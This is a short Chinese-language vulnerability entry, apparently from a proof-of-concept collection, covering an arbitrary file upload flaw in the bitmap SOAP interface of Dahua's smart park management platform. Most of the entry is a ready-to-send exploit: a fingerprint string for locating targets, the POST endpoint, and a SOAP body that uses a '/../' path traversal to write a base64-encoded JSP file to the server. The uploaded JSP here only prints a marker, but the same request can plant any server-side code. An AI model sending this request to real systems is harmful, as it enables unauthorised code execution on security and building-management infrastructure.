# 大华智慧园区综合管理平台bitmap接口存在任意文件上传漏洞

- **系统**：大华　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`"/WPMS/asset/lib/gridster/"`
- **请求**：`POST /emap/webservice/gis/soap/bitmap HTTP/1.1`
- **关键头**：`Content-Type: text/xml; charset=utf-8`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:res="http://response.webservice.bitmap.mapbiz.emap.dahuatech.com/">
<soapenv:Header/>
<soapenv:Body>
<res:uploadPicFile>
<arg0>
<picPath>/../dudesite.jsp</picPath>
</arg0>
<arg1>PCUgb3V0LnByaW50bG4oImZsYWdmbGFnIik7ICU+</arg1>
</res:uploadPicFile>
</soapenv:Body>
</soapenv:Envelope>
```
- **预期**：200　|　—